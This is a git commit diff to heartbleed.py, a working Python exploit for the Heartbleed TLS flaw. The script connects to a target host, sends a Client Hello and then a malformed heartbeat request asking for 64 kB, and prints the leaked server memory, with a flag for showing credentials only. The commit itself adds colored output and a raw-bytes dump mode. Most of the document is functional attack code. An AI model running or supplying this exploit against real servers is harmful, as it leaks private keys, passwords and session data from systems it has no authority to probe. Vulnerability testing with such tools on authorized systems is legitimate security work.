e76dea34e3ba2a79629cbc98e6e7b710caf873d1
prole <prole@oceania>
2019-08-16 18:36:28 -0700

    added stuff

--- heartbleed.py
+++ heartbleed.py
@@ -10,6 +10,7 @@ import select
 import os
 import argparse
 import codecs
+import string
 
 def main():
     '''
@@ -20,19 +21,13 @@ def main():
     reqd.add_argument('-t','--target',action='store',dest='tar',help='Target IP')
     reqd.add_argument('-p','--port',action='store',dest='prt',help='Target port')
     parser.add_argument('-o','--output',action='store',dest='out',help='Output file')
+    parser.add_argument('-r','--raw',action='store_true',dest='raw',help='Output raw bytes')
     parser.add_argument('-c','--creds',action='store_true',dest='creds',help='Print any creds only')
 
     args = parser.parse_args()
+
     os.system('')
     effect = effects()
-    print(effect.g_prefix)
-    print(effect.b_prefix)
-    print(effect.w_prefix)
-    print(effect.bl_prefix)
-    print(effect.warn_msg("TEST STRING"))
-    print(effect.err_msg("TEST STRING"))
-    print(effect.good_msg("TEST STRING"))
-    print(effect.blue_msg("TEST STRING"))
 
     helloPacket = (
         '16 03 02 00 31' # Content type = 16 (handshake message); Version = 03 02; Packet length = 00 31
@@ -50,33 +45,31 @@ def main():
     helloPacket = codecs.decode(helloPacket, 'hex')
     
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print("Connecting...")
+    print(effect.bl_prefix+effect.blue_msg("Connecting..."))
     sys.stdout.flush()
     sock.connect((args.tar, int(args.prt)))
-    print("Sending Client Hello...")
+    print(effect.bl_prefix+effect.blue_msg("Sending Client Hello..."))
     sys.stdout.flush()
     sock.send(helloPacket)
-    print("Waiting for Server Hello...")
+    print(effect.bl_prefix+effect.blue_msg("Waiting for Server Hello..."))
     sys.stdout.flush()
     # Receive packets until we get a hello done packet
     while True:
-        contentType, version, payload = receiveTLSMessage(sock)
+        contentType, version, payload = receiveTLSMessage(sock, effect)
         if contentType == None:
-            print("Server closed connection without sending Server Hello.")
+            print(effect.b_prefix+effect.err_msg("Server closed connection without sending Server Hello."))
             return
         # Look for server hello done message.
-        #print(payload[0])
         if contentType == 22 and payload[0] == 0x0E:
-            #if len(str(payload[0])) == 1:
-            #    if ord(str(payload[0])) == 0x0E:
             break
   
-    print("Sending heartbeat request...")
+    print(effect.bl_prefix+effect.blue_msg("Sending heartbeat request..."))
     sys.stdout.flush()
-    # Jared Stafford's version sends heartbleed packet here too. It may be a bug.
-    exploit(sock)
 
-def exploit(sock):
+    bleed(sock, effect, args.raw)
+    sys.exit(0)
+
+def bleed(sock, effect, raw):
     heartbleedPacket = (
         '18 03 02 00 03' # Content type = 18 (heartbeat message); Version = 03 02; Packet length = 00 03
         '01 FF FF'		 # Heartbeat message type = 01 (request); Payload length = FF FF
@@ -85,24 +78,24 @@ def exploit(sock):
     heartbleedPacket = codecs.decode(heartbleedPacket, 'hex')
     sock.send(heartbleedPacket)
 	# We asked for 64 kB, so we should get 4 packets
-    contentType, version, payload = receiveTLSMessage(sock, 4)
+    contentType, version, payload = receiveTLSMessage(sock, effect, 4)
     if contentType is None:
-        print("No heartbeat response received, server likely not vulnerable")
+        print(effect.g_prefix+effect.good_msg("No heartbeat response received, server likely not vulnerable"))
         return False
 
     if contentType == 24:
-        print("Received heartbeat response:")
-        dmp_pkt_data(payload)
+        print(effect.bl_prefix+effect.blue_msg("Received heartbeat response:"))
+        dmp_pkt_data(payload, raw)
         if len(payload) > 3:
-            print("WARNING: server returned more data than it should - server is vulnerable!")
+            print(effect.b_prefix+effect.err_msg("WARNING: server returned more data than it should - server is vulnerable!"))
         else:
-            print("Server processed malformed heartbeat, but did not return any extra data.")
+            print(effect.g_prefix+effect.good_msg("Server processed malformed heartbeat, but did not return any extra data."))
         return True
 
     if contentType == 21:
-        print("Received alert:")
-        dmp_pkt_data(payload)
-        print("Server returned error, likely not vulnerable")
+        print(effect.b_prefix+effect.err_msg("Received alert:"))
+        dmp_pkt_data(payload, raw)
+        print(effect.g_prefix+effect.good_msg("Server returned error, likely not vulnerable"))
         return False
 
 
@@ -124,36 +117,48 @@ def recv_pkt(sock, length):
             remain -= len(data)
     return recv_data
 
-def receiveTLSMessage(sock, fragments = 1):
+def receiveTLSMessage(sock, effect, fragments=1):
     contentType = None
     version = None
     length = None
     payload = b''
-	
+    
     # The server may send less fragments. Because of that, this will return partial data.
     for fragmentIndex in range(0, fragments):
         tlsHeader = recv_pkt(sock, 5) # Receive 5 byte header (Content type, version, and length)
 	
         if tlsHeader is None:
-            print("Unexpected EOF receiving record header - server closed connection")
+            print(effect.b_prefix+effect.err_msg("Unexpected EOF receiving record header - server closed connection"))
             return contentType, version, payload # Return what we currently have
 	
         contentType, version, length = struct.unpack('>BHH', tlsHeader) # Unpack the header
         payload_tmp = recv_pkt(sock, length) # Receive the data that the server told us it'd send
 
         if payload_tmp is None:
-            print("Unexpected EOF receiving record payload - server closed connection")
+            print(effect.b_prefix+effect.err_msg("Unexpected EOF receiving record payload - server closed connection"))
             return contentType, version, payload # Return what we currently have
 	
-        print("Received message: type = %d, ver = %04x, length = %d" % (contentType, version, len(payload_tmp)))
+        print(effect.bl_prefix+effect.blue_msg("Received message: type = %d, ver = %04x, length = %d") % (contentType, version, len(payload_tmp)))
 	
         payload = payload + payload_tmp
 	
     return contentType, version, payload
 
-def dmp_pkt_data(sock):
-    data = ''.join((str(c) if 32 <= c <= 126 else '.' ) for c in sock)
-    print("%s"% data)
+def dmp_pkt_data(sock, raw):
+    if not raw:
+        data = ''.join((str(chr(c)) if 32 <= c <= 126 else '') for c in sock)
+        print(data)
+    else:
+        data = ''.join((hex(c)+' ' if 32 <= c <= 126 else '') for c in sock)
+        i = 0
+        while i < len(data):
+            tmp_str = ''
+            for j in range(60):
+                if i >= len(data):
+                    break
+                tmp_str = tmp_str+data[i]
+                i += 1
+            print(tmp_str)
 
 class effects(object):
     BLUE = '\033[94m'
@@ -161,10 +166,10 @@ class effects(object):
     YELLOW = '\033[93m'
     RED = '\033[91m'
     ENDC = '\033[0m'
-    g_prefix = "["+GREEN+"*"+ENDC+"]"
-    b_prefix = "["+RED+"*"+ENDC+"]"
-    w_prefix = "["+YELLOW+"*"+ENDC+"]"
-    bl_prefix = "["+BLUE+"*"+ENDC+"]"
+    g_prefix = "["+GREEN+"*"+ENDC+"] "
+    b_prefix = "["+RED+"*"+ENDC+"] "
+    w_prefix = "["+YELLOW+"*"+ENDC+"] "
+    bl_prefix = "["+BLUE+"*"+ENDC+"] "
     
     def warn_msg(self, in_str):
         return self.YELLOW+in_str+self.ENDC
